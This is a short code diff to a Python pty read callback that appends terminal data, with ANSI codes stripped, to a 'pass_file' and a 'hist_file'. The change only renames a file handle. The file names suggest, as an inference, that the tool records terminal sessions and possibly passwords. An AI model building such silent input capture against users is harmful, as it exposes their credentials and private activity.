@@ -25,8 +25,8 @@ def read(fd):
     #script.write(data)
     with open(pass_file, 'a') as pf:
         pf.write(ansi_escape.sub('',data.decode("utf-8")))
-    with open(hist_file, 'a') as pf:
-        pf.write(ansi_escape.sub('',data.decode("utf-8")))
+    with open(hist_file, 'a') as hf:
+        hf.write(ansi_escape.sub('',data.decode("utf-8")))
     return data
 
 
